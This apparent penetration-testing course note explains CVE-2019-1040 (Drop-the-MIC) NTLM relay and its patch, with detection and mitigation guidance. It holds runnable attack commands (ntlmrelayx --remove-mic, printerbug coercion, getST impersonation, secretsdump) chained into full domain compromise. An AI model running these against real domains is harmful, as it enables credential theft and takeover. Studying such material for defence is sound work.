---
tags: [active-directory, coercion, relay, vapt]
difficulty: expert
module: "64 - Advanced Coercion and Relay Attacks"
topic: "64.12 Drop-the-MIC - Bypassing NTLM MIC"
---

# 12 - Drop-the-MIC - Bypassing NTLM MIC

## Introduction to NTLM Integrity Controls

Before dissecting the "Drop-the-MIC" attack (CVE-2019-1040), it is crucial to understand the defensive mechanisms integrated into the NTLM authentication protocol. NTLM is a challenge-response protocol consisting of three messages:
1. **Type 1 (NEGOTIATE)**: The client advertises its capabilities to the server.
2. **Type 2 (CHALLENGE)**: The server responds with its capabilities and a random 8-byte nonce (the challenge).
3. **Type 3 (AUTHENTICATE)**: The client responds with the challenge encrypted using the user's password hash, along with a final set of negotiated flags.

Historically, NTLM relay attacks involved an attacker sitting in the middle, intercepting the Type 1 message, forwarding it to a target, receiving the Type 2 challenge, forwarding it to the victim, and then capturing and relaying the final Type 3 authentication to the target.

To counter this, Microsoft implemented several integrity protections, primarily **SMB Signing**, **LDAP Signing**, and **EPA (Extended Protection for Authentication)**. To prevent attackers from simply modifying the Type 1 and Type 3 messages to disable these protections (e.g., flipping the "Negotiate Sign" flag from True to False), Microsoft introduced the **Message Integrity Code (MIC)**.

### The Message Integrity Code (MIC)

The MIC is an HMAC-MD5 hash calculated over all three NTLM messages (Type 1, Type 2, and Type 3). It is included in the final Type 3 message. Because the MIC is signed using the user's session key (which is derived from the user's password hash), an attacker acting as a man-in-the-middle cannot recalculate a valid MIC if they alter any part of the NTLM messages. 

If an attacker intercepts a Type 1 message and modifies the flags to disable SMB signing, the MIC sent by the client in the Type 3 message will not match the MIC calculated by the server (because the server received modified flags), and the authentication will be rejected.

## The Drop-the-MIC Vulnerability (CVE-2019-1040)

Discovered by Preempt (now CrowdStrike) in 2019, CVE-2019-1040 demonstrated a catastrophic failure in the implementation of the MIC validation. 

The core of the vulnerability lies in the fact that the server determines whether to *check* the MIC based on the presence of a specific flag in the `TargetInfo` field of the Type 3 message: `MSvAvFlags`. Specifically, the bit `0x00000002` (the `ValidMic` flag) tells the server, "Hey, I included a MIC, please verify it."

The flaw was two-fold:
1. **Unsigned TargetInfo**: The `TargetInfo` field in the Type 2 message was not properly bound or signed in a way that prevented an attacker from dropping the `ValidMic` flag from the ensuing Type 3 message.
2. **Optional Validation**: If an attacker actively removed the MIC from the Type 3 message AND removed the `ValidMic` flag from the `TargetInfo` payload, the server would completely bypass the MIC validation phase. 

By removing the MIC, the attacker is no longer bound by the integrity checks. They can modify the NTLM negotiation flags—such as disabling SMB signing requirements or modifying EPA data—and the server will happily accept the altered messages.

## ASCII Architecture: The Attack Flow

```text
+----------+                                 +------------+                               +------------+
|          |    1. Type 1 (NEGOTIATE)        |            |   1. Type 1 (Modified Flags)  |            |
|  Victim  | ------------------------------> |  Attacker  | ----------------------------> |   Target   |
| (Client) |                                 |  (Relay)   |                               |  (Server)  |
+----------+                                 +------------+                               +------------+
     ^                                             |                                             |
     |  2. Type 2 (CHALLENGE) w/ ValidMic Flag     |    2. Type 2 (CHALLENGE)                    |
     | <------------------------------------------ | <------------------------------------------ |
     |                                             |                                             |
     |                                             v                                             |
     |  3. Type 3 (AUTHENTICATE) w/ MIC            |    3. Type 3 (AUTHENTICATE)                 |
     | ------------------------------------------> |    *** ATTACKER MAGIC ***                   |
     |                                             |    - Remove MIC field                       |
     |                                             |    - Remove ValidMic flag from TargetInfo   |
     |                                             |    - Modify Signing/EPA Flags               |
     |                                             | ------------------------------------------> |
     |                                             |                                             |
     |                                             |    4. Success! (No MIC check performed)     |
     |                                             | <------------------------------------------ |
```

## Prerequisites for the Attack

1. **Unpatched Environment**: The target server (specifically, the server validating the authentication, which is often a Domain Controller) must be missing the June 2019 security updates.
2. **Coercion Mechanism**: The attacker needs a way to coerce the victim to authenticate to the attacker's relay machine. Tools like `PetitPotam`, `PrinterBug` (SpoolSample), or standard LLMNR/NBT-NS poisoning are used.
3. **Target Selection**: The target server must have a service that the attacker wishes to exploit. Commonly, this is LDAP on a Domain Controller, which usually requires signing but can be bypassed via Drop-the-MIC.

## Step-by-Step Execution

### Step 1: Setting up the Relay

The attack heavily relies on Impacket's `ntlmrelayx.py`. Following the disclosure of the vulnerability, Impacket was updated to include the `--remove-mic` flag, which automatically strips the MIC and modifies the required flags.

To exploit an Active Directory environment, attackers typically relay to LDAP on a Domain Controller to perform attacks like Resource-Based Constrained Delegation (RBCD) or Shadow Credentials.

```bash
# Setup ntlmrelayx to relay to LDAP on a DC
# -smb2support: Required for modern Windows environments
# --remove-mic: The magic flag to exploit CVE-2019-1040
# --delegate-access: Instructs ntlmrelayx to create a new machine account and configure RBCD
ntlmrelayx.py -t ldap://192.168.1.10 -smb2support --remove-mic --delegate-access
```

### Step 2: Coercing Authentication

With the relay listening, the attacker must force a high-privileged account (such as a Domain Controller or a vital server) to authenticate to the attacker's IP. 

Using `PrinterBug` (requires valid low-priv credentials):
```bash
# Coerce DC02 (192.168.1.11) to authenticate to the Attacker (192.168.1.5)
python3 printerbug.py domain.local/user:password@192.168.1.11 192.168.1.5
```

### Step 3: Relay and Exploitation

1. DC02 connects to the attacker over SMB.
2. `ntlmrelayx` intercepts the Type 1 message and forwards it to DC01 (192.168.1.10) over LDAP.
3. DC01 sends the Type 2 challenge back.
4. `ntlmrelayx` forwards the challenge to DC02.
5. DC02 generates the Type 3 response, complete with a MIC, and sends it to the attacker.
6. `ntlmrelayx` executes the Drop-the-MIC attack: it strips the MIC and the `ValidMic` flag, and forwards the modified Type 3 message to DC01.
7. DC01 accepts the authentication (as DC02) without validating the MIC.
8. `ntlmrelayx` then uses its LDAP access as DC02 to create a new computer object and modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of DC02, effectively granting the new computer object RBCD rights over DC02.

### Step 4: Full Compromise

The attacker now controls a new machine account that has RBCD rights over DC02. They can use `getST.py` to forge a service ticket for the `cifs` service on DC02 and gain code execution.

```bash
# Get a Service Ticket as Domain Admin using the RBCD rights
getST.py -spn cifs/dc02.domain.local domain.local/new_machine\$:password -impersonate Administrator

# Export the ticket
export KRB5CCNAME=Administrator.ccache

# Execute commands on DC02
secretsdump.py -k -no-pass dc02.domain.local
```

## Patch Analysis and Fixes

Microsoft addressed CVE-2019-1040 by fundamentally changing how the MIC is validated. 
Post-patch, the NTLM implementation enforces a strict binding between the `TargetInfo` fields and the MIC. If a client negotiates NTLMv2 (which is essentially ubiquitous now), the server *requires* a valid MIC to be present if the client is capable of computing it. The server no longer solely relies on the `ValidMic` flag in the `TargetInfo` to decide whether to perform the check.

Furthermore, Microsoft began enforcing stricter NTLM binding validations across various services (SMB, LDAP, HTTP) to ensure that the EPA and signing flags cannot be tampered with.

## Detection and Mitigation Strategies

### Mitigation

1. **Patching**: Ensure all Windows systems, especially Domain Controllers and critical servers, have the June 2019 (or later) security updates installed. This patch is the primary and most effective defense against Drop-the-MIC.
2. **Enforce SMB Signing**: While Drop-the-MIC could bypass SMB signing checks if the MIC was dropped, enforcing SMB signing globally provides a strong baseline defense against standard relay attacks.
3. **Require LDAP Signing and Channel Binding**: Configure Domain Controllers to require LDAP signing and LDAP Channel Binding. This ensures that even if NTLM is relayed, the lack of a proper channel binding token will cause the authentication to fail.
4. **Disable NTLM**: The ultimate mitigation is to transition the environment to entirely Kerberos-based authentication and disable NTLM outright. While operationally challenging, it eliminates entire classes of relay vulnerabilities.

### Detection

1. **Network Intrusion Detection Systems (NIDS)**: NIDS signatures can be written to detect NTLM Type 3 messages that are missing the MIC field when negotiating NTLMv2, especially when traversing towards critical infrastructure like DCs.
2. **Event Logs**: Look for anomalous LDAP authentications originating from unexpected IP addresses (the attacker's relay IP) rather than the actual IP of the coerced machine. Event ID 4624 (Logon) will show the network logon.
3. **Anomalous Object Creation**: The standard RBCD attack path involves creating a new computer account. Monitor for Event ID 4741 (A computer account was created) originating from suspicious IP addresses or user contexts.
4. **Attribute Modification**: Monitor Event ID 5136 for changes to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.

## Advanced Considerations and Legacy Impact

Drop-the-MIC completely shattered the assumption that NTLM was secure against relay attacks as long as signing was enforced. It forced red teams and defenders to re-evaluate the attack surface of NTLM. Even though it is an older vulnerability, it highlights the fragility of retrofitting cryptographic integrity checks (like the MIC) onto legacy, deeply entrenched protocols (like NTLM). 

The attack also perfectly illustrates the power of combining primitive vulnerabilities. Drop-the-MIC on its own just bypasses a check; but chained with coercion (PrinterBug) and AD misconfigurations (RBCD), it results in domain dominance.

## Real-World Attack Scenario

During an infrastructure penetration test against a manufacturing firm, the attacker identified that several Domain Controllers were running outdated Windows Server 2012 R2 images, missing the critical June 2019 patches (CVE-2019-1040). The attacker aimed to compromise `DC02` but lacked administrative credentials.

The attacker configured `ntlmrelayx.py` to target the LDAP service on `DC01` (10.10.10.10), explicitly using the `--remove-mic` flag and instructing the tool to configure Resource-Based Constrained Delegation (RBCD):
```bash
impacket-ntlmrelayx -t ldap://10.10.10.10 -smb2support --remove-mic --delegate-access
```

With the relay listening, the attacker utilized a compromised low-privileged account to run `printerbug.py`, coercing `DC02` (10.10.10.11) to authenticate back to the attacker's machine over SMB:
```bash
python3 printerbug.py corp.local/j.doe:Password123@10.10.10.11 10.10.10.50
```

As `DC02` sent its NTLM Type 3 (AUTHENTICATE) message to the attacker, `ntlmrelayx` executed the Drop-the-MIC attack. It stripped the Message Integrity Code (MIC) from the packet, removed the `ValidMic` flag from the `TargetInfo` block, and flipped the negotiation flags to explicitly state that LDAP Signing was not supported. The modified packet was then forwarded to `DC01`. 

Because `DC01` was unpatched, it did not strictly enforce the presence of the MIC when NTLMv2 was used. It accepted the unsigned authentication, believing it was communicating directly with `DC02`. Using this privileged LDAP session, `ntlmrelayx` created a new machine account (`ATTACKER_PC$`) and granted it RBCD rights over `DC02`.

The attacker then used `getST.py` to forge a Kerberos Service Ticket for the `cifs` service on `DC02` as the Domain Administrator, passed the ticket, and successfully executed DCSync against `DC02`, achieving total domain compromise.

## Chaining Opportunities

- **[[05 - Resource-Based Constrained Delegation (RBCD)]]**: As demonstrated in the execution steps, dropping the MIC allows for the execution of RBCD by relaying to LDAP.
- **[[11 - Shadow Credentials - MSDS-KeyCredentialLink]]**: Instead of RBCD, an attacker can use the relayed LDAP session to write a shadow credential to the target, achieving the same level of compromise with a different persistence mechanism.
- **[[13 - EPA Extended Protection Bypasses]]**: Drop-the-MIC is a spiritual predecessor to modern EPA bypasses. Understanding how flags are manipulated in this attack is crucial for comprehending EPA weaknesses.

## Related Notes
- [[11 - Shadow Credentials - MSDS-KeyCredentialLink]]
- [[13 - EPA Extended Protection Bypasses]]
- [[15 - Coercion and Relay Defense Strategies]]
- [[02 - NTLM Relay Attacks Deep Dive]]
- [[04 - Unconstrained and Constrained Delegation]]
